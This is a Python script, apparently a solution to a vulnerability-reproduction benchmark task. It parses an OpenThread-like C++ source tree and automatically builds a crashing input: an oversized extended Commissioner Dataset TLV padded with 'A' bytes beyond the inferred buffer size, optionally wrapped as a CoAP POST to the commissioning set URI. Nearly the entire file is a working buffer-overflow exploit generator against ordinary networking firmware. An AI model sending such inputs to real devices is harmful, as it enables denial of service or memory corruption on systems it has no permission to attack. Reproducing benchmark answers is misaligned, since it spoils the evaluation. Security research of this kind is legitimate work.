import os
import re
import tarfile
import tempfile
import ast
from typing import Dict, Optional, List, Tuple


def _read_text(path: str) -> str:
    try:
        with open(path, "rb") as f:
            data = f.read()
        return data.decode("utf-8", "ignore")
    except Exception:
        return ""


def _strip_comments(code: str) -> str:
    code = re.sub(r"/\*.*?\*/", "", code, flags=re.S)
    code = re.sub(r"//.*?$", "", code, flags=re.M)
    return code


def _remove_string_literals(code: str) -> str:
    code = re.sub(r'"(?:\\.|[^"\\])*"', '""', code)
    code = re.sub(r"'(?:\\.|[^'\\])*'", "''", code)
    return code


def _normalize_expr(expr: str) -> str:
    expr = expr.strip()
    expr = re.sub(r"\btrue\b", "1", expr, flags=re.I)
    expr = re.sub(r"\bfalse\b", "0", expr, flags=re.I)

    expr = re.sub(r"\bUINT\d+_C\s*\(\s*([^)]+)\s*\)", r"(\1)", expr)
    expr = re.sub(r"\bINT\d+_C\s*\(\s*([^)]+)\s*\)", r"(\1)", expr)

    expr = re.sub(r"static_cast\s*<[^>]*>\s*\(", "(", expr)

    expr = re.sub(
        r"\(\s*(?:u?int(?:8|16|32|64)_t|u?int(?:8|16|32|64)|unsigned|signed|long|short|int|char|bool|size_t|uint_fast\d+_t|int_fast\d+_t)\s*\)",
        "",
        expr,
        flags=re.I,
    )

    expr = re.sub(r"([A-Za-z_]\w*(?:::\w+)+)", lambda m: m.group(1).split("::")[-1], expr)

    expr = re.sub(r"(\b0x[0-9A-Fa-f]+|\b\d+)\s*([uUlL]+)\b", r"\1", expr)

    expr = expr.replace("/", "//")
    return expr.strip()


def _replace_sizeof(expr: str) -> str:
    s = expr
    out = []
    i = 0
    while i < len(s):
        j = s.find("sizeof", i)
        if j < 0:
            out.append(s[i:])
            break
        out.append(s[i:j])
        k = j + 6
        while k < len(s) and s[k].isspace():
            k += 1
        if k >= len(s) or s[k] != "(":
            out.append("sizeof")
            i = k
            continue
        depth = 0
        start = k
        end = None
        for t in range(k, len(s)):
            if s[t] == "(":
                depth += 1
            elif s[t] == ")":
                depth -= 1
                if depth == 0:
                    end = t
                    break
        if end is None:
            out.append(s[j:])
            break
        arg = s[start + 1 : end].strip()
        arg_norm = re.sub(r"\s+", " ", arg)
        arg_last = arg_norm.split("::")[-1].strip()
        sz = None
        prim = arg_last.replace("const ", "").replace("volatile ", "").strip()
        prim = re.sub(r"\s*\*+\s*$", "", prim).strip()
        prim_l = prim.lower()
        if prim_l in ("uint8_t", "int8_t", "char", "signed char", "unsigned char", "bool"):
            sz = 1
        elif prim_l in ("uint16_t", "int16_t"):
            sz = 2
        elif prim_l in ("uint32_t", "int32_t"):
            sz = 4
        elif prim_l in ("uint64_t", "int64_t"):
            sz = 8
        elif prim_l in ("size_t",):
            sz = 8
        else:
            name_l = prim.lower()
            if "extended" in name_l and "tlv" in name_l:
                sz = 4
            elif "tlv" in name_l:
                sz = 2
            else:
                sz = 0
        out.append(str(sz))
        i = end + 1
    return "".join(out)


class _SafeEval(ast.NodeVisitor):
    __slots__ = ()

    def visit(self, node):
        if isinstance(node, ast.Expression):
            return self.visit(node.body)
        if isinstance(node, ast.Constant):
            if isinstance(node.value, (int, bool)):
                return int(node.value)
            raise ValueError("bad constant")
        if isinstance(node, ast.UnaryOp):
            v = self.visit(node.operand)
            if isinstance(node.op, ast.UAdd):
                return +v
            if isinstance(node.op, ast.USub):
                return -v
            if isinstance(node.op, ast.Invert):
                return ~v
            raise ValueError("bad unary")
        if isinstance(node, ast.BinOp):
            a = self.visit(node.left)
            b = self.visit(node.right)
            op = node.op
            if isinstance(op, ast.Add):
                return a + b
            if isinstance(op, ast.Sub):
                return a - b
            if isinstance(op, ast.Mult):
                return a * b
            if isinstance(op, ast.FloorDiv):
                if b == 0:
                    return 0
                return a // b
            if isinstance(op, ast.LShift):
                return a << b
            if isinstance(op, ast.RShift):
                return a >> b
            if isinstance(op, ast.BitOr):
                return a | b
            if isinstance(op, ast.BitAnd):
                return a & b
            if isinstance(op, ast.BitXor):
                return a ^ b
            raise ValueError("bad binop")
        if isinstance(node, ast.ParenExpr):  # pragma: no cover
            return self.visit(node.value)
        raise ValueError("bad node")


def _try_eval_expr(expr: str, constants: Dict[str, int]) -> Optional[int]:
    expr = _normalize_expr(expr)
    expr = _replace_sizeof(expr)
    if not expr:
        return None

    def repl_ident(m):
        name = m.group(0)
        if name in ("and", "or", "not"):
            return name
        if name in constants:
            return str(constants[name])
        return name

    expr2 = re.sub(r"\b[A-Za-z_]\w*\b", repl_ident, expr)

    if re.search(r"\b[A-Za-z_]\w*\b", expr2):
        return None

    expr2 = expr2.replace("&&", " and ").replace("||", " or ").replace("!", " not ")
    expr2 = re.sub(r"\s+", " ", expr2).strip()
    if not expr2:
        return None
    try:
        tree = ast.parse(expr2, mode="eval")
        return int(_SafeEval().visit(tree))
    except Exception:
        return None


def _safe_extract_tar(tar_path: str, dst_dir: str) -> str:
    with tarfile.open(tar_path, "r:*") as tf:
        base = os.path.abspath(dst_dir)
        for member in tf.getmembers():
            name = member.name
            if not name or name.startswith("/") or name.startswith("\\"):
                continue
            target = os.path.abspath(os.path.join(dst_dir, name))
            if not target.startswith(base + os.sep) and target != base:
                continue
            try:
                tf.extract(member, dst_dir, set_attrs=False)
            except Exception:
                pass
    entries = [os.path.join(dst_dir, p) for p in os.listdir(dst_dir)]
    dirs = [p for p in entries if os.path.isdir(p)]
    if len(dirs) == 1 and all(os.path.commonpath([d, dirs[0]]) == dirs[0] for d in dirs):
        return dirs[0]
    return dst_dir


def _collect_source_files(root: str) -> List[str]:
    exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".ipp", ".inc")
    out = []
    for dp, dn, fn in os.walk(root):
        for f in fn:
            if f.endswith(exts):
                p = os.path.join(dp, f)
                try:
                    if os.path.getsize(p) > 2_000_000:
                        continue
                except Exception:
                    continue
                out.append(p)
    return out


def _build_constant_defs(file_texts: Dict[str, str]) -> Dict[str, str]:
    defs: Dict[str, str] = {}
    for _, text in file_texts.items():
        if not text:
            continue
        code = _strip_comments(text)
        code = _remove_string_literals(code)

        for m in re.finditer(r"(?m)^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*$", code):
            name = m.group(1)
            if "(" in name:
                continue
            val = m.group(2).strip()
            if not val or val.startswith('"') or val.startswith("'"):
                continue
            defs.setdefault(name, val)

        for m in re.finditer(
            r"\b(?:static\s+)?(?:constexpr|const)\b[^;=\n]*?\b([A-Za-z_]\w*)\b\s*=\s*([^;]+);",
            code,
        ):
            name = m.group(1)
            expr = m.group(2).strip()
            if not expr:
                continue
            if expr.startswith('"') or expr.startswith("'"):
                continue
            defs.setdefault(name, expr)

        for m in re.finditer(r"\benum\b[^{}]*\{([^}]+)\}", code, flags=re.S):
            body = m.group(1)
            for e in re.finditer(r"\b([A-Za-z_]\w*)\b\s*=\s*([^,}]+)", body):
                name = e.group(1)
                expr = e.group(2).strip()
                if not expr:
                    continue
                defs.setdefault(name, expr)

    return defs


def _resolve_constants(defs: Dict[str, str]) -> Dict[str, int]:
    constants: Dict[str, int] = {}
    simple_num = re.compile(r"^\s*(0x[0-9A-Fa-f]+|\d+)\s*$")
    for k, v in list(defs.items()):
        mm = simple_num.match(_normalize_expr(v))
        if mm:
            try:
                constants[k] = int(mm.group(1), 0)
            except Exception:
                pass

    pending = dict(defs)
    for _ in range(12):
        progress = False
        for name, expr in list(pending.items()):
            if name in constants:
                pending.pop(name, None)
                continue
            val = _try_eval_expr(expr, constants)
            if val is not None:
                constants[name] = int(val)
                pending.pop(name, None)
                progress = True
        if not progress:
            break
    return constants


def _extract_function_body(code: str, func_name: str) -> Optional[str]:
    idx = code.find(func_name)
    if idx < 0:
        return None

    for m in re.finditer(r"\b" + re.escape(func_name) + r"\b\s*\(", code):
        start = m.start()
        brace = code.find("{", m.end())
        if brace < 0:
            continue
        semi = code.find(";", m.end(), brace)
        if semi != -1:
            continue
        depth = 0
        i = brace
        while i < len(code):
            c = code[i]
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    return code[brace : i + 1]
            i += 1
    return None


def _infer_harness_mode(file_texts: Dict[str, str]) -> str:
    for _, text in file_texts.items():
        if "LLVMFuzzerTestOneInput" not in text:
            continue
        t = _strip_comments(text)
        if re.search(r"\bAppend(Bytes)?\s*\(\s*data\s*,\s*size\s*\)", t):
            return "payload"
        if re.search(r"\bInit\s*\(\s*data\s*,\s*size\s*\)", t) or re.search(r"\bSetLength\s*\(\s*size\s*\)", t):
            if "Coap" in t or "coap" in t:
                return "coap"
        if "Coap" in t and "data" in t and "size" in t:
            return "coap"
    return "payload"


def _infer_uri_paths(file_texts: Dict[str, str]) -> List[bytes]:
    pat = re.compile(r'OT_URI_PATH_COMMISSIONING_SET\s+"([^"]+)"')
    for _, text in file_texts.items():
        m = pat.search(text)
        if m:
            path = m.group(1).strip()
            if path:
                parts = [p for p in path.split("/") if p]
                if parts:
                    return [p.encode("ascii", "ignore") for p in parts]
    return [b"c", b"cs"]


def _infer_type_from_body(body: str, constants: Dict[str, int], key_regex: str) -> Optional[int]:
    if not body:
        return None
    names = set(re.findall(key_regex, body))
    for n in names:
        if n in constants and 0 <= constants[n] <= 255:
            return int(constants[n])
        n2 = n.split("::")[-1]
        if n2 in constants and 0 <= constants[n2] <= 255:
            return int(constants[n2])
    return None


def _infer_type_from_constants(constants: Dict[str, int], key_pat: re.Pattern) -> Optional[int]:
    candidates = []
    for k, v in constants.items():
        if 0 <= v <= 255 and key_pat.search(k):
            candidates.append((k, int(v)))
    if not candidates:
        return None
    candidates.sort(key=lambda kv: (0 if "Type" in kv[0] or "kType" in kv[0] else 1, len(kv[0])))
    return candidates[0][1]


def _infer_buffer_candidates(body: str, constants: Dict[str, int]) -> List[int]:
    candidates = []
    if not body:
        return candidates
    b = _strip_comments(body)
    for m in re.finditer(r"\b(?:uint8_t|char|uint16_t|uint32_t)\s+([A-Za-z_]\w*)\s*\[\s*([^\]]+)\s*\]\s*;", b):
        var = m.group(1)
        expr = m.group(2).strip()
        var_l = var.lower()
        if "commission" not in var_l and "dataset" not in var_l and "tlv" not in var_l:
            continue
        val = _try_eval_expr(expr, constants)
        if val is None:
            mm = re.match(r"^\s*(0x[0-9A-Fa-f]+|\d+)\s*$", expr)
            if mm:
                val = int(mm.group(1), 0)
        if val is not None and 8 <= val <= 4096:
            candidates.append(int(val))
    for k, v in constants.items():
        kl = k.lower()
        if ("max" in kl or "kmax" in kl) and ("commission" in kl and "dataset" in kl) and 8 <= v <= 4096:
            candidates.append(int(v))
    return candidates


def _encode_coap_uri_path_options(parts: List[bytes]) -> bytes:
    OPT_URI_PATH = 11
    out = bytearray()
    prev = 0
    for p in parts:
        opt = OPT_URI_PATH
        delta = opt - prev
        length = len(p)
        prev = opt

        def nib(v: int) -> int:
            if v < 13:
                return v
            if v < 269:
                return 13
            return 14

        dn = nib(delta)
        ln = nib(length)
        out.append((dn << 4) | ln)
        if dn == 13:
            out.append(delta - 13)
        elif dn == 14:
            out.extend(((delta - 269) >> 8 & 0xFF, (delta - 269) & 0xFF))
        if ln == 13:
            out.append(length - 13)
        elif ln == 14:
            out.extend(((length - 269) >> 8 & 0xFF, (length - 269) & 0xFF))
        out.extend(p)
    return bytes(out)


def _wrap_coap_post(payload: bytes, uri_parts: List[bytes]) -> bytes:
    # CoAP header: ver=1, type=CON(0), tkl=0 => 0x40
    # code=POST => 0x02, msgid=0x0000
    hdr = bytes([0x40, 0x02, 0x00, 0x00])
    opts = _encode_coap_uri_path_options(uri_parts)
    return hdr + opts + b"\xFF" + payload


def _make_tlv(t: int, value: bytes, force_extended: bool = False) -> bytes:
    t &= 0xFF
    n = len(value)
    if (not force_extended) and n <= 254:
        return bytes([t, n & 0xFF]) + value
    return bytes([t, 0xFF, (n >> 8) & 0xFF, n & 0xFF]) + value


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = None
        try:
            if os.path.isdir(src_path):
                root = src_path
            else:
                tmpdir = tempfile.TemporaryDirectory()
                root = _safe_extract_tar(src_path, tmpdir.name)

            files = _collect_source_files(root)
            file_texts: Dict[str, str] = {}
            for p in files:
                txt = _read_text(p)
                if txt:
                    file_texts[p] = txt

            defs = _build_constant_defs(file_texts)
            constants = _resolve_constants(defs)

            mode = _infer_harness_mode(file_texts)
            uri_parts = _infer_uri_paths(file_texts)

            handle_body = None
            for p, txt in file_texts.items():
                if "HandleCommissioningSet" not in txt:
                    continue
                body = _extract_function_body(txt, "HandleCommissioningSet")
                if body:
                    handle_body = body
                    break

            ds_type = None
            sess_type = None
            if handle_body:
                ds_type = _infer_type_from_body(handle_body, constants, r"\b(k\w*Commissioner\w*Dataset\w*)\b")
                sess_type = _infer_type_from_body(handle_body, constants, r"\b(k\w*Commissioner\w*Session\w*Id\w*)\b")

            if ds_type is None:
                ds_type = _infer_type_from_constants(constants, re.compile(r"Commissioner.*Dataset", re.I))

            if sess_type is None:
                sess_type = _infer_type_from_constants(constants, re.compile(r"Commissioner.*Session.*Id", re.I))

            include_session = False
            if handle_body and re.search(r"Commissioner\w*Session\w*Id", handle_body):
                include_session = True

            buf_candidates = _infer_buffer_candidates(handle_body or "", constants)
            buf_size = max(buf_candidates) if buf_candidates else None

            if buf_size is None:
                ds_len = 840
            else:
                ds_len = max(256, int(buf_size) + 1)
                if ds_len > 2000:
                    ds_len = 840

            if ds_type is None:
                ds_type = 0x00

            payload = bytearray()
            if include_session and sess_type is not None:
                payload += _make_tlv(sess_type, b"\x00\x00", force_extended=False)

            payload += _make_tlv(ds_type, b"A" * ds_len, force_extended=True)

            out = bytes(payload)
            if mode == "coap":
                out = _wrap_coap_post(out, uri_parts)
            return out
        finally:
            if tmpdir is not None:
                try:
                    tmpdir.cleanup()
                except Exception:
                    pass